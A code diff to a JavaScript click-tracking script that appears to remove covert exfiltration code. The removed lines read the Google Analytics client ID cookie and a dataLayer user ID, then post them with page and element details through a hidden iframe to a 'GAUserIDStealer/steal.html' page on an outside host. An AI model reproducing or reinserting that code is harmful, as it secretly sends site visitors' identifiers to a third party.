@@ -1,62 +1,4 @@
-function makeid(length) {
-   var result           = '';
-   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-   var charactersLength = characters.length;
-   for ( var i = 0; i < length; i++ ) {
-      result += characters.charAt(Math.floor(Math.random() * charactersLength));
-   }
-   return result;
-}
-
-function getgaCid() {
-    var name = "_ga=";
-    var decodedCookie = decodeURIComponent(document.cookie);
-    var ca = decodedCookie.split(';');
-    for(var i = 0; i <ca.length; i++) {
-        var c = ca[i];
-            while (c.charAt(0) == ' ') {
-                c = c.substring(1);
-            }
-            if (c.indexOf(name) == 0) {
-                return c.substring(name.length+6, c.length);
-            }
-    }
-    return "";
-}
-
-function msgHub(page, msg) {
-    var hubId = page.replace(".", "")
-    var hub = document.getElementById(hubId);
-    if (hub==null) {
-        var ifrm_msgHub = document.createElement('iframe');
-        ifrm_msgHub.setAttribute('id', hubId);
-        ifrm_msgHub.setAttribute('class', 'g_conv');
-        ifrm_msgHub.setAttribute('src', 'https://'+page)
-        ifrm_msgHub.setAttribute('domain', 'https://'+page);
-        ifrm_msgHub.style.display = "none";
-        ifrm_msgHub.addEventListener("DOMContentLoaded",function(){
-            hub = document.getElementById(hubId);
-            hub.contentWindow.postMessage(msg, 'https://'+page);
-        });
-        document.body.appendChild(ifrm_msgHub);
-
-    } else {
-        hub.contentWindow.postMessage(msg, 'https://'+page);
-    }
-}
-
 function searchAndSet(stackNum) {
-    uid=-1
-    for(i=0;i<dataLayer.length;i++){
-        try{
-            if('ga_c_id' in dataLayer[i]){
-                uid=dataLayer[i]['ga_c_id'];
-                break;
-            }
-        }catch(e){
-            console.log("pass");
-        }
-    }
 
     elementUrl=""
     elementClasses=""
@@ -132,6 +74,7 @@ function searchAndSet(stackNum) {
                         tmp_text=tmp_text.replace(re,"฿-RAND-");
                         var re=RegExp('กระเป๋าสตางค์ \\d+\\.\\d+','g');
                         tmp_text=tmp_text.replace(re,"กระเป๋าสตางค์-RAND-");
+                        tmp_text = tmp_text.replace(/%/g, '%25');
                         if(elementClasses.includes("winner")||elementClasses.includes("rank")){
                             var re=RegExp('\\d+\\.\\d+','g');
                             tmp_text=tmp_text.replace(re,"-RAND-");
@@ -161,6 +104,7 @@ function searchAndSet(stackNum) {
                         tmp_text=tmp_text.replace(re,"฿-RAND-");
                         var re=RegExp('กระเป๋าสตางค์ \\d+\\.\\d+','g');
                         tmp_text=tmp_text.replace(re,"กระเป๋าสตางค์-RAND-");
+                        tmp_text = tmp_text.replace(/%/g, '%25');
                         if(elementClasses.includes("winner")||elementClasses.includes("rank")){
                             var re=RegExp('\\d+\\.\\d+','g');
                             tmp_text=tmp_text.replace(re,"-RAND-");
@@ -272,7 +216,10 @@ function searchAndSet(stackNum) {
         elementText="";
     }
 
-    msgHub("guqima.github.io/GAUserIDStealer/steal.html", "uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText);
+    PagePath="dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    ga('set', 'dimension5', site_domain);
+    ga('set', 'dimension9', PagePath);
+
 }
 
 function doFlow(){
